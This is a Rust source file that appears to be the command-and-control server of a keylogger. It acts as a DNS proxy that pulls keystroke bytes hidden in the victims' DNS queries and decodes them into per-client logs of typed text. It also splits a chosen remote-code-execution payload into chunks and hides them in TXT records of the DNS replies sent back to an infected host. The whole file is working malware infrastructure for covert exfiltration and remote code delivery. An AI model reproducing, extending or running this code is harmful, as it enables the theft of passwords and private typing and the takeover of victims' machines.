use std::{
    collections::HashMap,
    net::{Ipv4Addr, SocketAddr},
    sync::Arc,
};

use anyhow::Error;
use log::{debug, info, log_enabled, Level};
use tamanoir_common::ContinuationByte;
use tokio::{net::UdpSocket, sync::Mutex};

use crate::{
    KeyMap, Layout, Session, TargetArch, AR_COUNT_OFFSET, AR_HEADER_LEN, FOOTER_LEN, FOOTER_TXT,
    KEYMAPS,
};

pub fn max_payload_length(current_dns_packet_size: usize) -> usize {
    512usize
        .saturating_sub(current_dns_packet_size)
        .saturating_sub(FOOTER_LEN + AR_HEADER_LEN)
}
pub fn init_keymaps() {
    let mut map = HashMap::<u8, KeyMap>::new();
    map.insert(
        Layout::Azerty as u8,
        serde_yaml::from_str::<KeyMap>(include_str!("../../../assets/layouts/azerty.yml")).unwrap(),
    );
    map.insert(
        Layout::Qwerty as u8,
        serde_yaml::from_str::<KeyMap>(include_str!("../../../assets/layouts/qwerty.yml")).unwrap(),
    );
    KEYMAPS.set(map).expect("Error initializing KEYMAPS");
}

pub async fn mangle(
    data: &[u8],
    addr: SocketAddr,
    payload_len: usize,
    sessions: Arc<Mutex<HashMap<Ipv4Addr, Session>>>,
) -> Result<Vec<u8>, u32> {
    if data.len() <= payload_len {
        return Err(0u32);
    }
    let mut current_sessions: tokio::sync::MutexGuard<'_, HashMap<Ipv4Addr, Session>> =
        sessions.lock().await;
    let mut payload_it = data[data.len() - payload_len..].iter();

    let layout = Layout::from(*payload_it.next().ok_or(0u32)?); //first byte is layout
    let payload: Vec<u8> = payload_it.copied().collect();

    let mut data = data[..(data.len().saturating_sub(payload_len))].to_vec();
    //Add recursion bytes (DNS)
    data[2] = 1;
    data[3] = 32;

    let key_map = KEYMAPS
        .get()
        .ok_or(0u32)?
        .get(&(layout as u8))
        .ok_or(0u32)?;

    let session = Session::new(addr).ok_or(0u32)?;
    if let std::collections::hash_map::Entry::Vacant(e) = current_sessions.entry(session.ip) {
        info!("Adding new session for client: {} ", session.ip);
        e.insert(session.clone());
    }

    let current_session = current_sessions.get_mut(&session.ip).unwrap();

    for k in payload {
        if k != 0 {
            let last_key_code = current_session.key_codes.last();
            if key_map.is_modifier(last_key_code) {
                let _ = current_session.keys.pop();
            }
            let mapped_keys = key_map.get(&k, last_key_code);
            current_session.key_codes.push(k);
            current_session.keys.extend(mapped_keys)
        }
    }
    if !log_enabled!(Level::Debug) {
        print!("\x1B[2J\x1B[1;1H");

        std::io::Write::flush(&mut std::io::stdout()).unwrap();
    }
    for session in current_sessions.values() {
        info!("{}\n", session);
    }

    Ok(data)
}

pub async fn forward_req(data: &Vec<u8>, dns_ip: Ipv4Addr) -> Result<Vec<u8>, u8> {
    debug!("Forwarding {} bytes", data.len());
    let sock = UdpSocket::bind("0.0.0.0:0").await.map_err(|_| 0u8)?;
    let remote_addr = format!("{}:53", dns_ip);
    sock.send_to(data.as_slice(), remote_addr)
        .await
        .map_err(|_| 0u8)?;
    let mut buf = vec![0u8; 512];
    let (len, _) = sock.recv_from(&mut buf).await.map_err(|_| 0u8)?;
    Ok(buf[..len].to_vec())
}

pub async fn add_info(
    data: &mut Vec<u8>,
    payload: &[u8],
    c_byte: ContinuationByte,
) -> anyhow::Result<Vec<u8>> {
    let mut n_ar = u16::from_be_bytes([data[AR_COUNT_OFFSET], data[AR_COUNT_OFFSET + 1]]);

    // we add a record
    n_ar += 1;
    let new_ar = n_ar.to_be_bytes();
    data[AR_COUNT_OFFSET] = new_ar[0];
    data[AR_COUNT_OFFSET + 1] = new_ar[1];

    let mut record = Vec::new();
    record.push(0u8); // no name
    record.extend_from_slice(&16u16.to_be_bytes()); // Type TXT
    record.extend_from_slice(&3u16.to_be_bytes()); // Class Chaos

    record.extend_from_slice(&300u32.to_be_bytes()); //TTL
    let payload_len = payload.len() as u16;
    let c_byte = c_byte as u8;

    let payload = [
        payload,
        FOOTER_TXT.as_bytes(),
        &[c_byte],
        &payload_len.to_le_bytes(),
    ]
    .concat();
    record.extend_from_slice(&((payload.len() + 1) as u16).to_be_bytes()); //Data Length
    record.push(payload.len() as u8); //TXT Length
    record.extend_from_slice(&payload); //TXT
    data.extend(record);
    Ok(data.clone())
}

pub struct DnsProxy {
    port: u16,
    dns_ip: Ipv4Addr,
    in_payload_len: usize,
    sessions: Arc<Mutex<HashMap<Ipv4Addr, Session>>>,
}
impl DnsProxy {
    pub fn new(port: u16, dns_ip: Ipv4Addr, in_payload_len: usize) -> Self {
        Self {
            port,
            dns_ip,
            in_payload_len,
            sessions: Arc::new(Mutex::new(HashMap::new())),
        }
    }
    pub async fn serve(&self) -> anyhow::Result<()> {
        {
            init_keymaps();
            let sock = UdpSocket::bind(format!("0.0.0.0:{}", self.port)).await?;
            debug!(
                "DNS proxy is listening on {}",
                format!("0.0.0.0:{}", self.port)
            );

            let mut current_sessions: tokio::sync::MutexGuard<'_, HashMap<Ipv4Addr, Session>> =
                self.sessions.lock().await;
            loop {
                let mut buf = [0u8; 512];
                let (len, addr) = sock.recv_from(&mut buf).await?;
                let s = Session::new(addr)
                    .ok_or(Error::msg(format!("could parse addr for session {}", addr)))?;
                if let std::collections::hash_map::Entry::Vacant(e) = current_sessions.entry(s.ip) {
                    info!("Adding new session for client: {} ", s.ip);
                    e.insert(s.clone());
                }
                debug!("{:?} bytes received from {:?}", len, addr);
                let data = mangle(
                    &buf[..len],
                    addr,
                    self.in_payload_len,
                    self.sessions.clone(),
                )
                .await
                .unwrap();
                if let Ok(mut data) = forward_req(&data, self.dns_ip).await {
                    let payload_max_len = max_payload_length(data.len());
                    debug!(
                        "foward request, response : init len={} max rce payload len={}",
                        data.len(),
                        payload_max_len
                    );

                    let current_session = current_sessions.get_mut(&s.ip).unwrap();
                    if let Some(mut rce_payload_buf) = current_session.rce_payload_buffer.clone() {
                        let rce_payload_selected = current_session.rce_payload.clone().unwrap();
                        if !rce_payload_buf.is_empty() {
                            let is_start = rce_payload_buf.len() == rce_payload_selected.len();
                            let out_payload: Vec<u8> = rce_payload_buf
                                .drain(0..payload_max_len.min(rce_payload_selected.len()))
                                .collect();
                            debug!("PAYLOAD SZ={}", out_payload.len());
                            let cbyte = if out_payload.len() == rce_payload_selected.len() {
                                ContinuationByte::ResetEnd
                            } else if rce_payload_buf.is_empty() {
                                ContinuationByte::End
                            } else if is_start {
                                ContinuationByte::Reset
                            } else {
                                ContinuationByte::Continue
                            };
                            let augmented_data = add_info(&mut data, &out_payload, cbyte).await?;
                            let len = sock.send_to(&augmented_data, addr).await?;
                            debug!("{:?} bytes sent", len);
                        }
                    }
                } else {
                    let len = sock.send_to(&data, addr).await?;
                    debug!("{:?} bytes sent", len);
                }
            }
        }
    }
    pub async fn set_rce_payload_for_session(
        &mut self,
        rce: String,
        addr: SocketAddr,
        target_arch: TargetArch,
    ) -> anyhow::Result<()> {
        let s = Session::new(addr)
            .ok_or(Error::msg(format!("could parse addr for session {}", addr)))?;
        let mut current_sessions: tokio::sync::MutexGuard<'_, HashMap<Ipv4Addr, Session>> =
            self.sessions.lock().await;
        match current_sessions.get_mut(&s.ip) {
            Some(existing_session) => existing_session.set_rce_payload(rce, target_arch),
            None => Err(Error::msg(format!("session {} doesn't exists", s.ip))),
        }
    }
}
